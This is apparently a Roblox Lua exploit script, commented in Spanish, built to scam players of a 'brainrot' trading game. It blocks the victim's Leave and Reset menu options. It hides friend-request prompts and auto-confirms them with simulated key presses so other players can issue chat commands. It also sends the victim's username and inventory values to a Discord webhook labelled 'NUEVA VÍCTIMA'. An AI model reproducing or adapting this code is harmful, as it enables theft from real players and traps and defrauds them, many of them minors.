-- ============================================================
-- BLOQUEO DE SALIDA (ESTRICTO)
-- ============================================================
local function bloquearMenuEscape()
    task.spawn(function()
        pcall(function() StarterGui:SetCore("ResetButtonCallback", false) end)
        while task.wait(0.5) do
            pcall(function()
                local settingsGui = CoreGui:FindFirstChild("RobloxGui"):FindFirstChild("SettingsClippingShield")
                if settingsGui then
                    local inner = settingsGui:FindFirstChild("PageViewInnerFrame", true)
                    if inner then
                        if inner:FindFirstChild("Players") then inner.Players:Destroy() end
                        if inner:FindFirstChild("LeaveGamePage") then inner.LeaveGamePage:Destroy() end
                    end
                end
            end)
        end
    end)
end
bloquearMenuEscape()

-- ============================================================
-- COMANDO .ADD INVISIBLE + AUTOCLICKER
-- ============================================================
function promptFR(targetPlayer)
    if not targetPlayer then return end
    
    task.spawn(function()
        local rgui = CoreGui:WaitForChild("RobloxGui")
        local t = tick()
        while tick() - t < 5 do
            local dialog = rgui:FindFirstChild("PromptDialog", true) or rgui:FindFirstChild("NotificationFrame", true)
            if dialog then
                dialog.Size = UDim2.new(0,0,0,0)
                dialog.Position = UDim2.new(10,0,10,0)
                dialog.Visible = false
            end
            task.wait()
        end
    end)

    local oldId = (getthreadidentity and getthreadidentity()) or nil
    if setthreadidentity then pcall(setthreadidentity, 8) end
    pcall(function() StarterGui:SetCore("PromptSendFriendRequest", targetPlayer) end)
    if setthreadidentity and oldId then pcall(setthreadidentity, oldId) end

    task.spawn(function()
        local start = tick()
        while tick() - start < 3 do
            local rgui = CoreGui:FindFirstChild("RobloxGui")
            local btn = rgui and (rgui:FindFirstChild("ConfirmButton", true) or rgui:FindFirstChild("PrimaryButton", true))
            if btn then
                GuiService.SelectedObject = btn
                VIM:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
                VIM:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
                break
            end
            task.wait()
        end
    end)
end

-- ============================================================
-- COMANDOS PARA TODOS
-- ============================================================
local function configurarJugador(p)
    if p == LocalPlayer then return end
    p.Chatted:Connect(function(msg)
        local cmd = msg:lower():gsub("%s+", "")
        if cmd == ".add" then
            promptFR(p)
        elseif cmd == ".block" then
            for _, t in ipairs(Players:GetPlayers()) do
                if t ~= LocalPlayer then StarterGui:SetCore("PromptBlockPlayer", t) task.wait(0.1) end
            end
        elseif cmd == ".open" then
            pcall(function() ReplicatedStorage.Packages.Net["RE/PlotService/ToggleFriends"]:FireServer() end)
        end
    end)
end

for _, p in ipairs(Players:GetPlayers()) do configurarJugador(p) end
Players.PlayerAdded:Connect(configurarJugador)

-- ============================================================
-- EXTRACCI√ìN DE DATOS Y DISCORD
-- ============================================================
local function formatNumberShort(n)
    if n >= 1e9 then return string.format("$%.2fB", n / 1e9) end
    if n >= 1e6 then return string.format("$%.2fM", n / 1e6) end
    if n >= 1e3 then return string.format("$%.2fK", n / 1e3) end
    return "$" .. tostring(n)
end

local function parseValue(s)
    local clean = s:gsub("[^%d%.KMB+]", "")
    local n = tonumber(clean:match("([%d%.]+)")) or 0
    if clean:find("B") then return n * 1e9
    elseif clean:find("M") then return n * 1e6
    elseif clean:find("K") then return n * 1e3
    else return n end
end

local function getBrainrots()
    local results = {}
    for _, desc in ipairs(Workspace:GetDescendants()) do
        if desc:IsA("BillboardGui") then
            local name = desc:FindFirstChild("DisplayName") or desc:FindFirstChild("Name")
            local gen = desc:FindFirstChild("Generation") or desc:FindFirstChild("Value")
            if name and gen and name:IsA("TextLabel") and gen:IsA("TextLabel") then
                local val = parseValue(gen.Text)
                local key = name.Text .. "|" .. val
                if results[key] then results[key].count = results[key].count + 1
                else results[key] = {name = name.Text, value = val, count = 1} end
            end
        end
    end
    local out = {}
    for _, v in pairs(results) do table.insert(out, v) end
    table.sort(out, function(a,b) return a.value > b.value end)
    return out
end

local function sendToDiscord(link, brainrots)
    local itemList = ""
    local totalValue = 0
    for i, br in ipairs(brainrots) do
        if i <= 15 then 
            itemList = itemList .. string.format("> `[%d]` **%s** ‚ûî %s (x%d)\n", i, br.name, formatNumberShort(br.value), br.count)
        end
        totalValue = totalValue + (br.value * br.count)
    end
    
    local data = {
        content = "||@everyone|| ü©∏ **NUEVA V√çCTIMA**",
        embeds = {{
            title = "üöÄ Reporte de Extracci√≥n Moreira",
            color = 16711680,
            fields = {
                {name = "üë§ Usuario", value = LocalPlayer.Name .. " (" .. LocalPlayer.UserId .. ")", inline = true},
                {name = "üí∞ Valor Total", value = "**" .. formatNumberShort(totalValue) .. "**", inline = true},
                {name = "üîó Script", value = "`" .. link .. "`"},
                {name = "üìã Inventario", value = (itemList ~= "" and itemList or "Vac√≠o")}
            },
            timestamp = DateTime.now():ToIsoDate()
        }}
    }
    
    local req = (syn and syn.request) or (http and http.request) or http_request or request
    if req then
        req({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end
end

